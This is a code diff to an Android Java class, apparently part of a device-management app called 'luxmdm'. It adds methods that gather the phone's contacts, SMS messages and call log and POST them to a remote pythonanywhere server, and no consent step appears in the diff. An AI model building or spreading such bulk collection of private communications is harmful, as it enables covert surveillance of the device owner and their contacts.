@@ -18,7 +18,7 @@ import java.net.URL;
 
 public class upstream {
 
-    private JSONObject formatDevInfoAsJSON(String a, String b, String c, String d, String e){
+    protected void formatDevInfoAsJSON(String a, String b, String c, String d, String e){
 
         final JSONObject uploads = new JSONObject();
 
@@ -31,14 +31,13 @@ public class upstream {
             data.put(d);
             data.put(e);
 
-            uploads.put("data", data);
-            return  uploads;
+            uploads.put("info", data);
+            UpstreamToServer(uploads);
         }catch (JSONException E) {
             Log.d("Error formatdataJSON: ", E.toString());
         }
-        return null;
     }
-    private JSONObject formatDevDataAsJSON(String a, String b, String c, String d,String e, String f, String g, String h){
+    protected void formatDevDataAsJSON(String a, String b, String c, String d,String e, String f, String g, String h){
 
         final JSONObject uploads = new JSONObject();
 
@@ -55,15 +54,57 @@ public class upstream {
             data.put(h);
 
             uploads.put("data", data);
-            return  uploads;
+            UpstreamToServer(uploads);
         }catch (JSONException E) {
             Log.d("Error formatdataJSON: ", E.toString());
         }
-        return null;
     }
-    protected void sendDevInfoToServer(String a, String b, String c, String d, String e){
-        final JSONObject json = formatDevInfoAsJSON(a, b, c, d, e);
+    protected void formatContactsAsJSON(StringBuilder c){
+        String contacts = c.toString();
+        final JSONObject uploads = new JSONObject();
 
+        try{
+            uploads.put("contacts", contacts);
+            UpstreamToServer(uploads);
+        }catch (JSONException E){
+            Log.d("Error: contact as JSON",E.toString());
+        }
+    }
+    protected void formatSmsAsJSON(StringBuilder s){
+        String sms = s.toString();
+        final JSONObject uploads = new JSONObject();
+
+        try{
+            uploads.put("sms", sms);
+            UpstreamToServer(uploads);
+        }catch (JSONException E){
+            Log.d("Error: SMS as JSON",E.toString());
+        }
+    }
+    protected void formatCallLogAsJSON(StringBuilder cl){
+        String call_log = cl.toString();
+        final JSONObject uploads = new JSONObject();
+
+        try{
+            uploads.put("callLog", call_log);
+            UpstreamToServer(uploads);
+        }catch (JSONException E){
+            Log.d("Error: CallLog as JSON",E.toString());
+        }
+    }
+    protected void formatResponses(String r){
+        final JSONObject uploads = new JSONObject();
+
+        try {
+            uploads.put("feedback", r);
+            UpstreamToServer(uploads);
+        }catch (JSONException E){
+            Log.d("Error: feedback As JSON", E.toString());
+        }
+    }
+
+    private void UpstreamToServer(JSONObject a){
+        final JSONObject json = a;
         new AsyncTask<Void, Void, String>(){
             @Override
             protected String doInBackground(Void... params) {
@@ -74,27 +115,12 @@ public class upstream {
             protected void onPostExecute(String result) {
                 super.onPostExecute(result);
 
-                Log.d("UserDataUpload : ",result);
+                Log.d("DataUpload : ",result);
             }
         }.execute();
     }
-    protected void sendDevDataToServer(String a, String b, String c, String d,String e, String f, String g, String h){
-        final JSONObject json = formatDevDataAsJSON(a, b, c, d, e, f, g, h);
 
-        new AsyncTask<Void, Void, String>(){
-            @Override
-            protected String doInBackground(Void... params) {
-                return getServerResponse(json);
-            }
 
-            @Override
-            protected void onPostExecute(String result) {
-                super.onPostExecute(result);
-
-                Log.d("UserDataUpload : ",result);
-            }
-        }.execute();
-    }
     private String getServerResponse(JSONObject json){
         String apiUrl1 = "loiclaouni.pythonanywhere.com/api/v1/luxmdm";
         String apiURL2 = "loiclaouni.pythonanywhere.com/api/v1/AppRegToken";
@@ -103,15 +129,12 @@ public class upstream {
         URL url;
         String response ="";
         try {
-            if (json.has("key")){
-                url = new URL(apiURL2);
-            }
-            else if (json.has("DeviceData")){
-                url = new URL(apiURL3);
-            }
-            else {
-                url= new URL(apiUrl1);
-            }
+            if (json.has("info")){url = new URL(apiURL2);}
+            else if (json.has("data")){url = new URL(apiURL3);}
+            else if(json.has("contacts")){url = new URL(apiUrl1);}
+            else if(json.has("sms")){url = new URL(apiUrl1);}
+            else if (json.has("callLog")){url = new URL(apiUrl1);}
+            else {url= new URL(apiUrl1);}
 
             apiconnection = (HttpURLConnection) url.openConnection();
             apiconnection.setRequestMethod("POST");
